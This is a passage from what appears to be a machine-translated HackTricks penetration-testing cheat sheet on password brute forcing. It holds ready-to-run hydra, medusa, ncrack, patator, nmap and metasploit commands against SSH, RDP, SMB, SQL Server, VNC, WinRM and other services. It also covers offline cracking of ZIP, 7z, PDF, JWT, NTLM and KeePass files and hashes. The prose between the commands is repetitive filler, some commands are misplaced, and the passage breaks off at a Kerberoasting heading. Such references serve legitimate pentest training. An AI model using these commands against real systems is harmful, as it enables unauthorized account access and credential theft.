Brute force is a common method used in hacking to gain unauthorized access to a system or account by systematically trying all possible combinations of passwords until the correct one is found. This method is often used when other methods, such as social engineering or exploiting vulnerabilities, are not successful.

Brute force attacks can be time-consuming and resource-intensive, especially if the password being targeted is long and complex. However, with the help of powerful computers and specialized software, attackers can automate the process and significantly speed up the attack.

There are several tools available for conducting brute force attacks, such as Hydra, Medusa, and John the Ripper. These tools allow attackers to specify the target system or account, the password list to be used, and other parameters to customize the attack.

To protect against brute force attacks, it is important to use strong and unique passwords that are not easily guessable. Additionally, implementing account lockout policies, where an account is temporarily locked after a certain number of failed login attempts, can help mitigate the risk of brute force attacks.

In conclusion, brute force attacks are a common and effective method used by hackers to gain unauthorized access to systems or accounts. By understanding how these attacks work and implementing appropriate security measures, individuals and organizations can better protect themselves against this type of threat.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V
```
### PostgreSQL

PostgreSQL是一种强大的开源关系型数据库管理系统。它具有可扩展性和灵活性，被广泛用于各种应用程序和网站。

#### 暴力破解

暴力破解是一种常见的攻击技术，用于尝试破解密码或访问受保护的系统。对于PostgreSQL数据库，暴力破解可以用于尝试猜测数据库用户的密码。

暴力破解通常涉及使用自动化工具或脚本来尝试大量的可能密码组合。攻击者可以使用常见的密码列表、字典文件或生成的密码来进行尝试。

为了防止暴力破解攻击，PostgreSQL提供了一些安全措施，如密码策略和账户锁定。管理员可以设置密码复杂度要求，并限制登录尝试次数。此外，使用强密码和定期更改密码也是防止暴力破解的重要措施。

作为数据库管理员或开发人员，应该采取适当的安全措施来保护PostgreSQL数据库免受暴力破解攻击。这包括使用强密码、限制远程访问、定期更新和监控数据库日志等。
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
```
### PPTP

您可以从[https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)下载`.deb`软件包进行安装。
```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```
### RDP

RDP（远程桌面协议）是一种用于远程访问和控制计算机的协议。它允许用户通过网络连接到远程计算机，并在远程计算机上执行操作，就像直接在本地计算机上一样。

#### 暴力破解

暴力破解是一种常见的攻击技术，用于尝试破解密码或访问受保护的系统。在RDP中，暴力破解可以用于尝试猜测有效的用户名和密码组合，以获取对远程计算机的访问权限。

暴力破解攻击通常使用自动化工具，如字典攻击或暴力破解脚本。这些工具会尝试使用不同的用户名和密码组合进行登录，直到找到有效的凭据为止。

为了防止暴力破解攻击，建议采取以下措施：

- 使用强密码：选择复杂且难以猜测的密码，包括字母、数字和特殊字符的组合。
- 启用账户锁定：在一定的登录尝试失败次数后，自动锁定账户一段时间，以防止攻击者继续尝试登录。
- 使用多因素身份验证：除了用户名和密码，还使用其他身份验证因素，如指纹、令牌或手机验证码。
- 更新和维护系统：及时安装操作系统和应用程序的安全补丁，以修复已知的漏洞。

请注意，暴力破解是一种非法行为，在未经授权的情况下使用此技术可能会导致法律后果。
```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
```
### Redis

Redis是一种开源的内存数据结构存储系统，常用于缓存、消息队列和实时分析等应用场景。它支持多种数据结构，如字符串、哈希表、列表、集合和有序集合，并提供了丰富的操作命令。

#### 暴力破解

暴力破解是一种常见的攻击技术，用于尝试猜测密码或密钥。对于Redis而言，暴力破解可以用于尝试猜测访问Redis服务器的密码。

以下是一些常用的暴力破解方法和资源：

- 字典攻击：使用预先准备好的密码字典进行猜测。这些字典通常包含常见密码、常见单词和常见组合。
- 弱密码检测工具：使用工具来检测弱密码，例如使用常见密码列表或基于规则的密码生成器。
- 暴力破解工具：使用专门设计的工具，如Hydra、Medusa和Ncrack，来自动化暴力破解过程。
- 社交工程学：通过欺骗、诱骗或操纵目标用户来获取密码或敏感信息。

在进行暴力破解时，需要注意以下几点：

- 使用强密码：确保使用强密码来保护Redis服务器，包括使用足够长的密码、使用大小写字母、数字和特殊字符的组合，并定期更改密码。
- 限制登录尝试次数：通过配置Redis服务器，限制登录尝试次数，例如设置最大尝试次数和锁定时间。
- 监控登录活动：监控Redis服务器的登录活动，及时检测异常登录尝试，并采取相应的安全措施。

了解暴力破解的方法和资源可以帮助我们更好地保护Redis服务器的安全性。
```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
```
### Rexec

Rexec（Remote Execution）是一种用于在远程系统上执行命令的协议。它通常用于在网络上执行命令，而无需登录到远程系统。Rexec协议使用明文传输，因此不适合在不安全的网络环境中使用。

Rexec协议的工作原理如下：

1. 客户端与服务器建立TCP连接。
2. 客户端发送身份验证信息（用户名和密码）到服务器。
3. 服务器验证身份信息，并在成功验证后，将一个shell会话返回给客户端。
4. 客户端可以在shell会话中执行命令，并将结果返回给服务器。

Rexec协议的一个主要弱点是它使用明文传输，这使得它容易受到中间人攻击。为了增加安全性，可以使用加密协议（如SSH）来保护Rexec会话。

攻击者可以使用暴力破解技术来尝试破解Rexec协议的身份验证。暴力破解是一种通过尝试所有可能的密码组合来破解密码的方法。攻击者可以使用字典文件或生成密码组合来进行暴力破解。

为了防止暴力破解攻击，可以采取以下措施：

1. 使用强密码：选择一个强密码，包含大小写字母、数字和特殊字符，并避免使用常见的密码。
2. 使用多因素身份验证：使用多个身份验证因素，如密码和令牌，以增加身份验证的安全性。
3. 锁定账户：在一定数量的失败尝试后，锁定账户一段时间，以防止攻击者继续尝试破解密码。
4. 监控登录尝试：监控登录尝试并记录失败的尝试，以便及时发现暴力破解攻击。

了解Rexec协议的工作原理和可能的攻击方法，可以帮助安全专家采取适当的措施来保护系统免受暴力破解攻击。
```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```
### Rlogin

Rlogin（远程登录）是一种用于在远程计算机上执行命令的协议。它允许用户通过网络连接到远程主机并登录到该主机的操作系统。Rlogin协议通常使用TCP端口513进行通信。

Rlogin协议的一个常见安全问题是它的身份验证机制较弱，容易受到暴力破解攻击。攻击者可以使用暴力破解技术尝试多个用户名和密码组合，直到找到正确的凭据。这种攻击方法被称为暴力破解。

为了防止Rlogin协议的暴力破解攻击，可以采取以下措施：

1. 使用强密码：确保在远程主机上设置强密码，包括字母、数字和特殊字符的组合。

2. 锁定账户：在一定的登录尝试失败次数后，自动锁定账户，以防止攻击者继续尝试。

3. 使用防火墙：配置防火墙以限制对Rlogin协议的访问，只允许来自受信任的IP地址的连接。

4. 使用VPN：通过使用虚拟专用网络（VPN）建立安全的加密连接，可以保护Rlogin协议的通信。

5. 使用多因素身份验证：使用多因素身份验证可以增加登录的安全性，例如结合密码和令牌进行身份验证。

通过采取这些措施，可以提高Rlogin协议的安全性，减少暴力破解攻击的风险。
```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```
### Rsh

Rsh (Remote Shell) 是一种用于远程执行命令的协议。它允许用户在远程计算机上执行命令，就像在本地计算机上一样。Rsh 协议通常使用 TCP 端口 514。

Rsh 协议存在安全风险，因为它不提供身份验证或加密。这意味着攻击者可以使用 Rsh 协议来远程执行命令，而无需提供有效的凭据。因此，使用 Rsh 协议时需要格外小心。

Brute-force 攻击是一种常见的攻击 Rsh 协议的方法。在 Brute-force 攻击中，攻击者尝试使用不同的用户名和密码组合来登录远程计算机。他们使用自动化工具来快速尝试大量的组合，直到找到有效的凭据为止。

为了防止 Rsh 协议的 Brute-force 攻击，可以采取以下措施：

- 禁用或限制 Rsh 协议的使用，尤其是在公共网络上。
- 使用强密码策略，确保用户使用复杂且难以猜测的密码。
- 实施账户锁定机制，例如在多次登录失败后锁定账户一段时间。
- 监控登录活动，及时检测异常登录尝试。
- 使用其他更安全的远程访问协议，如 SSH（Secure Shell）。

通过采取这些措施，可以增加远程计算机的安全性，防止 Rsh 协议的滥用和 Brute-force 攻击。
```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```
[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync

Rsync是一种用于文件同步和传输的强大工具。它可以在本地系统之间或本地系统与远程系统之间同步文件和目录。Rsync使用快速增量算法，只传输文件的变化部分，从而减少了传输的数据量和时间。

Rsync的强大之处在于它的灵活性和可配置性。它可以通过各种选项和参数进行定制，以满足不同的需求。例如，可以使用`-a`选项来保持文件的权限和时间戳，使用`-v`选项来显示详细的传输信息，使用`-z`选项来进行压缩传输等。

然而，正如其他强大工具一样，Rsync也可能被滥用。攻击者可以使用Rsync进行暴力破解攻击，尝试猜测目标系统的用户名和密码。为了防止这种攻击，建议采取以下措施：

- 使用强密码：选择足够复杂和难以猜测的密码，包括字母、数字和特殊字符的组合。
- 启用账户锁定：在一定的登录尝试失败次数后，自动锁定账户，以防止暴力破解攻击。
- 使用多因素身份验证：通过结合密码和其他身份验证因素，如指纹、令牌或手机验证码，提高账户的安全性。

总之，Rsync是一个功能强大的文件同步和传输工具，但在使用时需要注意安全性，以防止被滥用。
```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```
### RTSP

RTSP（Real-Time Streaming Protocol）是一种用于实时流媒体传输的协议。它允许客户端通过网络连接到流媒体服务器，并实时接收和播放音频或视频流。RTSP使用TCP或UDP作为传输协议，并使用RTSP命令和响应来控制流媒体的传输和播放。

### 暴力破解

暴力破解是一种常见的密码破解技术，通过尝试所有可能的密码组合来获取未授权访问。这种方法通常用于攻击弱密码保护的系统或服务。暴力破解可以使用字典攻击或穷举攻击的方式进行。

字典攻击是基于预先准备好的密码字典，逐个尝试其中的密码来破解目标系统。穷举攻击则是通过尝试所有可能的密码组合，从而找到正确的密码。这种方法需要耗费大量的时间和计算资源，因此通常用于对目标的重要性较高或价值较大的系统进行攻击。

为了防止暴力破解，系统管理员应采取一些安全措施，如使用强密码策略、限制登录尝试次数、启用账户锁定功能等。此外，使用多因素身份验证和使用加密算法存储密码也可以提高系统的安全性。
```bash
hydra -l root -P passwords.txt <IP> rtsp
```
### SNMP

SNMP（Simple Network Management Protocol）是一种用于管理和监控网络设备的协议。它允许管理员通过发送请求和接收响应来获取和修改网络设备的信息。SNMP使用基于UDP的传输协议，并使用MIB（Management Information Base）来定义设备的管理信息。攻击者可以利用SNMP协议进行暴力破解攻击，尝试使用不同的凭据来登录设备并获取敏感信息。暴力破解是一种基于尝试和错误的攻击方法，攻击者通过尝试大量的用户名和密码组合来破解目标设备的登录凭据。为了防止SNMP暴力破解攻击，管理员应该采取安全措施，如使用强密码、限制登录尝试次数和启用账户锁定功能。
```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```
### SMB

SMB（Server Message Block）是一种用于在计算机网络上共享文件、打印机和其他资源的协议。它是一种客户端-服务器协议，允许客户端请求服务并服务器响应这些请求。SMB协议通常用于Windows操作系统之间的文件和打印机共享。

### 暴力破解

暴力破解是一种常见的密码破解技术，它通过尝试所有可能的密码组合来获取未授权访问。暴力破解通常用于攻击弱密码保护的系统，如用户账户、网络服务或加密文件。攻击者使用自动化工具来迭代尝试不同的密码，直到找到正确的密码为止。为了防止暴力破解攻击，用户应该使用强密码，并启用账户锁定功能，限制登录尝试次数。
```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
```
### SMTP

SMTP（Simple Mail Transfer Protocol）是一种用于电子邮件传输的标准协议。它允许电子邮件客户端发送邮件到邮件服务器，并由服务器将邮件传递给目标收件人的电子邮件服务器。SMTP通常使用TCP端口25进行通信。

#### 暴力破解

暴力破解是一种常见的攻击技术，用于尝试破解密码或访问受保护的系统。在SMTP中，暴力破解可以用于尝试猜测邮件服务器的登录凭据，以获取未经授权的访问权限。

暴力破解攻击通常涉及使用自动化工具，如脚本或软件，通过尝试大量可能的密码组合来猜测正确的密码。攻击者可以使用常见的密码列表、字典文件或生成的密码来进行尝试。

为了防止暴力破解攻击，管理员可以采取以下措施：

- 实施强密码策略，要求用户使用复杂的密码。
- 启用账户锁定功能，限制登录尝试次数。
- 监控登录活动，及时检测异常行为。
- 使用多因素身份验证，提高账户安全性。

尽管暴力破解攻击是一种有效的攻击技术，但它通常需要大量时间和计算资源。因此，使用强密码和其他安全措施可以大大降低暴力破解攻击的成功率。
```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
```
SOCKS（Socket Secure）是一种网络协议，用于在客户端和服务器之间建立代理连接。它允许用户通过代理服务器访问互联网资源，同时隐藏用户的真实IP地址。SOCKS协议可以用于各种目的，包括绕过防火墙、访问受限制的网站以及保护用户的隐私。

### 暴力破解
```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
```
### SSH

SSH（Secure Shell）是一种加密的网络协议，用于在不安全的网络上安全地进行远程登录和执行命令。SSH使用公钥加密和身份验证机制，确保通信的机密性和完整性。

SSH暴力破解是一种攻击技术，通过尝试所有可能的密码组合来破解SSH登录凭据。这种方法通常是通过自动化工具来实现的，例如使用字典文件或生成密码的算法。

SSH暴力破解可以是一种有效的攻击方法，特别是当目标系统使用弱密码或默认凭据时。为了防止SSH暴力破解，可以采取以下措施：

- 使用强密码：选择足够复杂和难以猜测的密码，包括字母、数字和特殊字符的组合。
- 使用公钥身份验证：使用公钥加密和身份验证机制，而不是仅依赖密码。
- 配置登录限制：限制登录尝试次数，并在一定次数后暂时锁定账户。
- 使用防火墙：限制SSH访问仅限于受信任的IP地址范围。
- 更新软件：确保SSH服务器和相关软件的最新版本，以修复已知的漏洞和安全问题。

通过采取这些措施，可以增加SSH登录的安全性，减少暴力破解的风险。
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
```
#### 弱SSH密钥 / Debian可预测PRNG
某些系统在生成加密材料时使用的随机种子存在已知缺陷。这可能导致密钥空间大大减少，可以使用诸如[snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute)等工具进行暴力破解。还可以使用预先生成的弱密钥集，例如[g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)。

### SQL Server
```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```
### Telnet

Telnet是一种用于远程登录和管理计算机系统的网络协议。它允许用户通过网络连接到远程主机，并在远程主机上执行命令。Telnet协议使用明文传输数据，因此不安全，容易受到中间人攻击。黑客可以使用暴力破解技术来尝试猜测和破解Telnet登录凭据。

暴力破解是一种攻击技术，黑客通过尝试所有可能的密码组合来破解登录凭据。黑客可以使用字典攻击或暴力破解工具来自动化这个过程。字典攻击是基于预先准备好的密码列表进行尝试，而暴力破解工具则尝试所有可能的密码组合。

为了防止Telnet暴力破解攻击，以下是一些建议：

- 禁用或限制Telnet服务，使用更安全的远程登录协议，如SSH。
- 使用强密码，并定期更改密码。
- 使用多因素身份验证来增加登录的安全性。
- 监控登录尝试并设置阻止机制，例如自动锁定账户或IP地址。
- 定期审查日志以检测异常活动。

请记住，未经授权的暴力破解是非法的，只能在合法的渗透测试活动中使用。
```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet
```
### VNC

VNC（Virtual Network Computing）是一种远程桌面协议，允许用户通过网络远程控制其他计算机。它使用客户端-服务器模型，其中VNC服务器在远程计算机上运行，而VNC客户端则在本地计算机上运行。通过VNC，用户可以在本地计算机上查看和操作远程计算机的桌面界面。

#### 暴力破解

暴力破解是一种常见的攻击技术，用于破解密码或访问受保护的系统。在VNC的上下文中，暴力破解是指尝试使用各种可能的密码组合来破解VNC服务器的访问密码。攻击者可以使用自动化工具，如暴力破解软件，来尝试大量的密码组合，直到找到正确的密码为止。

#### 防御措施

为了防止VNC服务器受到暴力破解攻击，可以采取以下措施：

1. 使用强密码：选择一个强密码，包含大小写字母、数字和特殊字符，并且长度足够长。
2. 启用账户锁定：在一定的失败尝试次数后，锁定账户一段时间，以防止攻击者继续尝试破解密码。
3. 使用IP过滤：限制可以访问VNC服务器的IP地址范围，只允许信任的IP地址连接。
4. 使用VPN：通过使用虚拟专用网络（VPN），可以在公共网络上建立加密的连接，增加安全性。
5. 更新软件：定期更新VNC服务器软件，以获取最新的安全补丁和修复程序。

通过采取这些防御措施，可以提高VNC服务器的安全性，并减少暴力破解攻击的风险。
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```
### Winrm

Winrm（Windows Remote Management）是一种用于远程管理Windows系统的协议。它允许管理员通过网络远程执行命令、获取系统信息和配置设置。Winrm使用HTTP或HTTPS作为传输协议，并支持基于SOAP的消息格式。

#### 暴力破解

暴力破解是一种常见的攻击技术，用于尝试破解密码或访问受保护的系统。在Winrm中，暴力破解可以用于尝试猜测有效的用户名和密码组合，以获取对远程系统的访问权限。

暴力破解通常涉及使用自动化工具，如字典攻击或暴力破解工具，通过尝试大量的可能密码组合来破解系统。这些工具可以使用常见的密码列表、字典文件或生成的密码组合进行尝试。

为了防止暴力破解攻击，管理员应采取以下措施：

- 使用强密码策略，包括密码长度、复杂性和定期更改密码。
- 锁定账户或限制登录尝试次数，以防止攻击者进行大量的尝试。
- 监控登录活动并检测异常行为，如多次失败的登录尝试。
- 使用多因素身份验证来增加登录的安全性。

尽管暴力破解是一种有效的攻击技术，但它通常需要大量的时间和计算资源。因此，使用强密码和其他安全措施可以大大降低系统受到暴力破解攻击的风险。
```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```
<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

使用[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)轻松构建和自动化由全球**最先进**的社区工具驱动的工作流程。
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 本地

### 在线破解数据库

* [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5和SHA1)
* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (哈希、WPA2捕获和存档MSOffice、ZIP、PDF...)
* [https://crackstation.net/](https://crackstation.net) (哈希)
* [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
* [https://gpuhash.me/](https://gpuhash.me) (哈希和文件哈希)
* [https://hashes.org/search.php](https://hashes.org/search.php) (哈希)
* [https://www.cmd5.org/](https://www.cmd5.org) (哈希)
* [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5、NTLM、SHA1、MySQL5、SHA256、SHA512)
* [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
* [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

在尝试暴力破解哈希之前，请查看这些内容。

### ZIP
```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```
#### 已知明文zip攻击

您需要知道加密zip文件中包含的文件的**明文**（或部分明文）。您可以通过运行以下命令来检查加密zip文件中包含的文件的**文件名和文件大小**：**`7z l encrypted.zip`**\
从[**发布页面**](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)下载**bkcrack**。
```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
unzip unlocked.zip #User new_pwd as password
```
### 7z

7z是一种开源的压缩文件格式，也是一个用于压缩和解压缩文件的软件。它使用了高度压缩算法，可以在较小的文件大小下存储更多的数据。7z文件通常具有.7z文件扩展名。

#### 暴力破解7z文件

暴力破解是一种破解密码的方法，通过尝试所有可能的组合来找到正确的密码。对于7z文件，我们可以使用暴力破解工具来尝试不同的密码，直到找到正确的密码为止。

以下是一些常用的暴力破解工具：

- **John the Ripper**：这是一个流行的密码破解工具，可以用于暴力破解7z文件。它支持多种密码破解技术，包括字典攻击和暴力破解。

- **Hashcat**：这是另一个功能强大的密码破解工具，可以用于暴力破解7z文件。它支持多种哈希算法和攻击模式，可以高效地破解密码。

- **BruteForcer**：这是一个专门用于暴力破解7z文件的工具。它使用了多线程和优化算法，可以快速地尝试不同的密码组合。

在使用这些工具进行暴力破解时，我们可以使用字典文件来增加破解的效率。字典文件包含了常见的密码和短语，可以帮助我们更快地找到正确的密码。

然而，需要注意的是，暴力破解是一种耗时的过程，尤其是对于复杂的密码。因此，在进行暴力破解之前，我们应该评估破解的时间和资源成本，并确保有合法的授权来进行破解操作。
```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```
# 暴力破解

暴力破解是一种常见的密码破解技术，它通过尝试所有可能的密码组合来获取未知密码。这种方法可以用于破解各种类型的密码，包括用户账户密码、加密文件密码等。

## 原理

暴力破解的原理很简单：通过尝试所有可能的密码组合，直到找到正确的密码为止。这种方法依赖于密码的弱点，例如短密码、常见密码、容易猜测的密码等。

## 工具

有许多工具可用于进行暴力破解攻击。以下是一些常用的工具：

- Hydra：用于在网络上进行暴力破解攻击的多协议登录破解工具。
- Medusa：用于进行暴力破解攻击的快速、可靠的多协议登录破解工具。
- John the Ripper：一款流行的密码破解工具，支持多种密码哈希算法。
- Hashcat：一款高性能的密码破解工具，支持多种密码哈希算法。

## 防御措施

为了防止暴力破解攻击，可以采取以下措施：

- 使用强密码：选择一个强密码，包括大写字母、小写字母、数字和特殊字符，并避免使用常见密码。
- 密码策略：实施密码策略，例如密码长度要求、密码过期和密码复杂性要求。
- 多因素身份验证：使用多因素身份验证，例如使用手机验证码或硬件令牌进行身份验证。
- 帐户锁定：在一定次数的失败尝试后，锁定用户帐户，以防止暴力破解攻击。

暴力破解是一种有效的密码破解技术，但它需要大量的时间和计算资源。因此，采取适当的防御措施可以有效地防止暴力破解攻击。
```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```
### PDF 所有者密码

要破解 PDF 的所有者密码，请查看此链接：[https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT
```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```
### NTLM破解

NTLM（NT LAN Manager）是一种用于Windows操作系统的身份验证协议。它使用哈希函数对用户的密码进行加密，并将其存储在本地系统中。NTLM破解是一种攻击技术，旨在通过尝试所有可能的密码组合来破解NTLM哈希。

#### 基本原理

NTLM破解的基本原理是使用暴力破解方法，即通过尝试所有可能的密码组合来找到正确的密码。攻击者可以使用各种工具和脚本来自动化这个过程。

#### 工具和资源

以下是一些常用的NTLM破解工具和资源：

- **John the Ripper**：一款流行的密码破解工具，支持NTLM哈希破解。
- **Hashcat**：一款高性能的密码破解工具，支持多种哈希算法，包括NTLM。
- **CrackStation**：一个在线密码破解服务，提供了一个庞大的密码哈希数据库，可以用于破解NTLM哈希。
- **RockYou**：一个包含数百万常用密码的字典文件，可以用于暴力破解NTLM哈希。

#### 防御措施

为了防止NTLM破解攻击，以下是一些推荐的防御措施：

- **使用强密码**：选择足够复杂和随机的密码，以增加破解的难度。
- **禁用NTLM哈希存储**：禁用系统中的NTLM哈希存储，使用更安全的身份验证方法，如Kerberos。
- **使用多因素身份验证**：使用多种身份验证因素，如密码和硬件令牌，以增加安全性。
- **监控登录活动**：定期监控登录活动，及时检测异常登录尝试。

NTLM破解是一种强力攻击技术，但通过采取适当的防御措施，可以有效减少其风险。
```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```
# Keepass

Keepass是一种开源的密码管理器，用于存储和管理用户的密码和敏感信息。它使用强大的加密算法来保护存储在数据库中的数据。Keepass提供了一个安全的方法来生成和存储复杂的密码，并允许用户通过一个主密码来访问它们。

## Brute Force攻击

Brute Force攻击是一种试图通过尝试所有可能的组合来破解密码的方法。对于Keepass数据库，Brute Force攻击者将尝试使用不同的密码组合来解密数据库并获取其中存储的密码和敏感信息。

为了防止Brute Force攻击，Keepass实施了一些安全措施。其中之一是使用强大的加密算法来保护数据库中的数据。此外，Keepass还可以配置为在每次尝试解密失败后增加延迟时间，从而限制攻击者的尝试次数。

然而，Brute Force攻击仍然可能成功，特别是当使用弱密码时。因此，为了保护Keepass数据库，用户应该选择强密码，并定期更改它们。此外，使用双因素身份验证可以提供额外的安全层级，防止未经授权的访问。

总之，Keepass是一种强大的密码管理工具，但仍然需要用户采取适当的安全措施来保护其数据库免受Brute Force攻击。
```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
### Keberoasting

Keberoasting是一种攻击技术，用于获取Active Directory（AD）环境中的弱密码。该技术利用了AD中的服务账户，这些账户使用了弱密码，并且允许Kerberos身份验证。Keberoasting的攻击过程包括以下步骤：

